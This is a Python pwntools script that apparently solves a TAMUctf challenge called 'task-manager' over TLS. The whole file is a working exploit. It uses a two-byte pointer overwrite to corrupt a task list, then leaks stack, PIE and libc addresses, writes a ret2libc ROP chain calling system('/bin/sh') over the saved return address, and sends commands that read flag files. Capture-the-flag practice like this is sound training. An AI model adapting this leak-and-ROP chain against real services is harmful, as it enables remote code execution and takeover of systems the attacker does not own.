from pwn import *

HOST = "streams.tamuctf.com"
PORT = 443
SNI = "task-manager"

elf = ELF("./task-manager")
libc = ELF("./libc.so.6")
rop = ROP(libc)

POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
RET = rop.find_gadget(["ret"]).address
RET_DELTA = 0x27268

context.log_level = "error"
context.timeout = 5


def parse_entered(buf):
    key = b"Task you entered: "
    i = buf.find(key)
    if i < 0:
        return None
    j = buf.find(b"\n", i)
    if j < 0:
        return None
    return buf[i + len(key) : j]


def run_once(attempt):
    io = remote(HOST, PORT, ssl=True, sni=SNI)

    def add(data):
        io.sendline(b"1")
        io.recvuntil(b"Enter task (max. 80 characters): ")
        io.send(data)
        return io.recvuntil(b"Enter your input: ")

    def delete():
        io.sendline(b"3")
        return io.recvuntil(b"Enter your input: ")

    io.recvuntil(b"Enter your name (max. 40 characters): ")
    io.send(b"X\n")
    io.recvuntil(b"Enter your input: ")

    # 1) Calibrate low-2-byte overwrite to redirect A->next to taskPointer
    out = add(b"A" * 80)
    le = parse_entered(out)
    if not le or len(le) < 82:
        raise Exception("calib leak failed")
    orig_low16 = le[80] | (le[81] << 8)
    target_low16 = (orig_low16 - 0xC0) & 0xFFFF
    delete()
    delete()

    # 2) Leak stack &tasks from TaskHead->head
    add(b"A" * 80 + p16(target_low16))
    out = add(b"B" * 8)
    le = parse_entered(out)
    if not le or len(le) < 14:
        raise Exception("stack leak failed")
    stack_tasks = u64(le[8:].ljust(8, b"\x00"))
    saved_rip = stack_tasks + 0xB0
    ptr_main_addr = stack_tasks + 0xC0
    delete()  # size -> 1

    # 3) Leak PIE pointer from startup frame
    payload_tp = p64(0) + p64(stack_tasks) + b"\x00" + b"R" * 63 + p64(ptr_main_addr)
    add(payload_tp)
    out = add(p8(0x31))
    le = parse_entered(out)
    if not le or len(le) < 6:
        raise Exception("pie leak failed")
    main_ptr = u64(le.ljust(8, b"\x00"))
    pie_base = main_ptr - elf.sym["main"]
    size_addr = pie_base + elf.sym["size"]

    # 4) Leak libc return
    add(b"C" * 80 + p64(saved_rip))
    out = add(p8(0x68))
    le = parse_entered(out)
    if not le or len(le) < 6:
        raise Exception("libc leak failed")
    ret_addr = u64(le.ljust(8, b"\x00"))
    libc_base = ret_addr - RET_DELTA
    if libc_base & 0xFFF:
        raise Exception("libc base misaligned")

    pop_rdi = libc_base + POP_RDI
    ret = libc_base + RET
    system = libc_base + libc.sym["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

    # 5) Make saved_rip the current spare (avoid cycle issues), then write ROP
    delete()  # size 5 -> 4
    rop_chain = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
    add(rop_chain.ljust(80, b"P") + p64(size_addr))

    # 6) Write size=-1, then main does size += 1 => 0
    add(p64(0xFFFFFFFFFFFFFFFF) + b"\x00" + b"S" * (88 - 9))

    # 7) Exit: cleanup loop skipped, return into ROP
    io.sendline(b"5")
    io.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls -la")
    data = io.recvrepeat(2)
    print(f"--- attempt {attempt} ---")
    print(data.decode("latin-1", "ignore"))
    io.close()
    return data


for i in range(1, 51):
    try:
        d = run_once(i)
        low = d.lower()
        if b"{" in d and b"}" in d:
            break
        if b"flag" in low and b"no such file" not in low:
            break
    except Exception:
        pass
